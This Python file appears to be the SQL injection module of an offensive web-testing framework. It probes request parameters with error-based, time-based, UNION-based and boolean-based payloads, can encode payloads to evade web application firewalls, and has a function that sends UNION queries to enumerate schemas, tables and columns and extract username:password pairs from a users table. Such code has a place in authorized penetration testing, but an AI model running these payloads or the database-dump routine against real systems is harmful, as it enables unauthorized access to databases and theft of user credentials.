#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SQL Injection Module
Advanced SQLi detection and exploitation
"""

import os
import sys
import re
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Payloads, Colors


class SQLiModule:
    """SQL Injection Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "SQL Injection"
        
        # SQL Error signatures
        self.error_signatures = {
            'mysql': [
                'sql syntax', 'mysql_fetch', 'mysql_query', 'mysqli_',
                'you have an error in your sql syntax',
                'warning: mysql', 'mysqli_error',
                'unclosed quote', 'quoted string not properly terminated',
                'unknown column', 'table', 'doesn\'t exist',
            ],
            'postgresql': [
                'pg_query', 'pg_exec', 'postgresql', 'psql',
                'syntax error at or near',
                'warning: pg_',
            ],
            'mssql': [
                'microsoft sql', 'mssql', 'sql server',
                'odbc sql server driver',
                'unclosed quotation mark',
                'incorrect syntax near',
            ],
            'oracle': [
                'ora-', 'oracle', 'ora_error',
                'quoted string not properly terminated',
                'sql command not properly ended',
            ],
            'sqlite': [
                'sqlite_query', 'sqlite3',
                'near ".*": syntax error',
                'unrecognized token',
            ],
            'generic': [
                'sql syntax', 'syntax error', 'unexpected',
                'sqlstate', 'jdbc', 'odbc',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for SQL Injection"""
        # Test error-based SQLi
        self._test_error_based(url, method, param, value)
        
        # Test time-based SQLi
        self._test_time_based(url, method, param, value)
        
        # Test union-based SQLi
        self._test_union_based(url, method, param, value)
        
        # Test boolean-based SQLi
        self._test_boolean_based(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for SQLi"""
        pass  # URL-based tests handled by parameter tests
    
    def _test_error_based(self, url: str, method: str, param: str, value: str):
        """Test for error-based SQLi"""
        payloads = Payloads.SQLI_ERROR_BASED
        
        # Apply WAF bypass if enabled
        if self.engine.config.get('waf_bypass'):
            all_payloads = []
            for p in payloads:
                all_payloads.extend(self.requester.waf_bypass_encode(p))
            payloads = list(set(all_payloads))
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for SQL errors
                response_text = response.text.lower()
                detected_db = None
                
                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        if sig.lower() in response_text:
                            detected_db = db_type
                            break
                    if detected_db:
                        break
                
                if detected_db:
                    from core.engine import Finding
                    finding = Finding(
                        technique=f"SQL Injection ({detected_db.upper()})",
                        url=url,
                        severity='HIGH',
                        confidence=0.9,
                        param=param,
                        payload=payload,
                        evidence=f"Database error detected: {detected_db}",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'SQLi test error: {e}')}")
    
    def _test_time_based(self, url: str, method: str, param: str, value: str):
        """Test for time-based blind SQLi"""
        payloads = Payloads.SQLI_TIME_BASED
        
        for payload in payloads:
            try:
                data = {param: payload}
                
                start_time = time.time()
                response = self.requester.request(url, method, data=data)
                elapsed = time.time() - start_time
                
                # If response took > 5 seconds, likely time-based SQLi
                if elapsed >= 4.5:
                    from core.engine import Finding
                    finding = Finding(
                        technique="SQL Injection (Time-based Blind)",
                        url=url,
                        severity='HIGH',
                        confidence=0.8,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.2f}s",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Time-based SQLi test error: {e}')}")
    
    def _test_union_based(self, url: str, method: str, param: str, value: str):
        """Test for UNION-based SQLi"""
        payloads = Payloads.SQLI_UNION_BASED
        
        # Test with incrementing column count
        for i in range(1, 10):
            try:
                nulls = ','.join(['NULL'] * i)
                payload = f"' UNION SELECT {nulls} --"
                
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check if UNION was successful (no error and different response)
                if response.status_code == 200:
                    # Check for version info in response
                    version_patterns = [
                        r'\d+\.\d+\.\d+',  # version numbers
                        r'ubuntu|debian|centos',  # OS info
                        r'mysql|postgresql|mssql|oracle',  # DB info
                    ]
                    
                    for pattern in version_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            from core.engine import Finding
                            finding = Finding(
                                technique="SQL Injection (UNION-based)",
                                url=url,
                                severity='CRITICAL',
                                confidence=0.85,
                                param=param,
                                payload=payload,
                                evidence="UNION query executed successfully",
                            )
                            self.engine.add_finding(finding)
                            return
                            
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'UNION SQLi test error: {e}')}")
    
    def _test_boolean_based(self, url: str, method: str, param: str, value: str):
        """Test for boolean-based blind SQLi"""
        try:
            # Get baseline response
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            
            if not baseline:
                return
            
            baseline_len = len(baseline.text)
            
            # Test true condition
            true_payload = f"{value}' AND '1'='1"
            true_data = {param: true_payload}
            true_response = self.requester.request(url, method, data=true_data)
            
            # Test false condition
            false_payload = f"{value}' AND '1'='2"
            false_data = {param: false_payload}
            false_response = self.requester.request(url, method, data=false_data)
            
            if true_response and false_response:
                true_len = len(true_response.text)
                false_len = len(false_response.text)
                
                # If TRUE and FALSE responses differ significantly from each other,
                # and TRUE response is closer to baseline, likely boolean-based SQLi
                diff_true_false = abs(true_len - false_len)
                diff_baseline_true = abs(baseline_len - true_len)
                
                if diff_true_false > 50 and diff_baseline_true < diff_true_false:
                    from core.engine import Finding
                    finding = Finding(
                        technique="SQL Injection (Boolean-based Blind)",
                        url=url,
                        severity='HIGH',
                        confidence=0.75,
                        param=param,
                        payload=true_payload,
                        evidence=f"Response differs between TRUE ({true_len}) and FALSE ({false_len})",
                    )
                    self.engine.add_finding(finding)
                    
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Boolean SQLi test error: {e}')}")
    
    def exploit_dump_database(self, url: str, param: str, db_type: str = 'mysql'):
        """Attempt to dump database"""
        print(f"{Colors.info(f'Attempting to dump {db_type} database...')}")
        
        if db_type == 'mysql':
            queries = [
                "' UNION SELECT null,schema_name,null FROM information_schema.schemata --",
                "' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() --",
                "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users' --",
                "' UNION SELECT null,concat(username,':',password),null FROM users --",
            ]
        elif db_type == 'postgresql':
            queries = [
                "' UNION SELECT null,datname,null FROM pg_database --",
                "' UNION SELECT null,tablename,null FROM pg_tables --",
            ]
        else:
            queries = []
        
        results = []
        for query in queries:
            try:
                data = {param: query}
                response = self.requester.request(url, 'POST', data=data)
                if response:
                    results.append({
                        'query': query,
                        'response': response.text,
                    })
            except Exception as e:
                print(f"{Colors.error(f'Dump error: {e}')}")
        
        return results
